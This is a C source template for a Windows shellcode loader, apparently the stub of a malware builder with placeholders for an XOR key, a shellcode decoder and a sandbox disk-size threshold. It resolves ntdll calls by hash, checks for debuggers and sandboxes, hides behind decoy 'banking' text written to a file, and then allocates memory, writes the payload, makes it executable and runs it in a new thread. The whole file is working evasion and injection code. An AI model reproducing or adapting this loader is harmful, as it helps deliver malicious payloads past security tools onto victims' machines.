#include "definitions.h"

// #define RANDOM_VAL (__TIME__[3] * __TIME__[6])
#define RANDOM_VAL 0

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    srand(time(NULL));
    char path[MAX_PATH]; 

    int min = 3000 + RANDOM_VAL;
    int max = 15000;
    int range = max - min + 1;
    int money =  min + (int)(rand() / (double)RAND_MAX * range);
    
    uint16_t key = %XOR_KEY%;
    
    snprintf(path, MAX_PATH, "%s\\Documents\\market.txt", getenv("USERPROFILE"));  
    printf("start");    
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
    HMODULE hKernel32dll = NULL;
    FILE *file = fopen(path, "w");

    if (file == NULL || is_being_debugged(hNtdll)) {
        printf("Error during file openning : %s\n", path);
        return 1;
    } else {
        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH);
    }

    fprintf(file, "Hey, welcoming to the banking system !\n");

    int disk_size = get_disk_size(hKernel32dll);
    if (money > 1000 && (disk_size < 0 || disk_size < %SANDBOX__DISKSIZE%)) {
        fprintf(file, "You have enough money !!!\n");
        clean_exit(file);
    } else {
        fprintf(file, "Vous don't have enough money: %d€ !!!\n",disk_size);
    }

    // const char* hostname = get_hostname(hKernel32dll);
    // if (key > 0 && is_valid_hostname(hostname)) {
    //     fprintf(file, "You have a key, which is : %s\n", hostname);
    // } else {
    //     fprintf(file, "You don't have a key, your's is : %s and result is %d\n", hostname, strcmp(hostname,"C82PP24177"));
    //     clean_exit(file);
    // }

    fprintf(file, "You have a nice account ! Let's get the transaction done !\n");
    fclose(file);


    
    

    SIZE_T regionSize = sizeof(payload);
    PVOID exec = NULL;
    DWORD old_protect = 0;
    HANDLE th;
    BOOL rv;
  
    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);


    // Allocating executable memory
    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    %SHELLCODE_DECODER%

    // Copy shellcode into allocated memory
    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);

    // Changing memory protection to PAGE_EXECUTE_READ
    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);

    // Waiting for thread to finish
    _NtWaitForSingleObj(th, false, NULL);

    return 0;
}
